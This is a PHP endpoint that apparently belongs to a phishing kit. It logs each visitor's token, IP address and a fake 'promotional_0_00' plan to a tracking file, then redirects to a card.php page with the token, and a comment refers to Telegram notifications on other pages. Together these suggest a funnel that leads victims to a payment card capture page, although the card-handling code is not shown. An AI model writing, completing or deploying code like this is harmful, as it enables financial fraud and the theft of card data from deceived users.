<?php
// SEND PLAN DATA
require_once(__DIR__ . '/../config.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

// Get IP
$ip = $_SERVER['REMOTE_ADDR'];

// Store plan confirmation data
$pageTracksFile = '../store/page_tracks.json';
$pageTracks = [];

if (file_exists($pageTracksFile)) {
    $pageTracks = json_decode(file_get_contents($pageTracksFile), true) ?? [];
}

// Add plan confirmation to page tracks
if (!isset($pageTracks[$token])) {
    $pageTracks[$token] = [];
}

$pageTracks[$token]['plan'] = [
    'timestamp' => date('Y-m-d H:i:s'),
    'plan_selected' => 'promotional_0_00',
    'ip' => $ip
];

file_put_contents($pageTracksFile, json_encode($pageTracks, JSON_PRETTY_PRINT));

// No Telegram notification for plan page - just track it
$result = ['ok' => true];

// Auto-redirect to card page WITH TOKEN
echo json_encode([
    'success' => $result['ok'],
    'redirect' => './card.php?token=' . urlencode($token)
]);

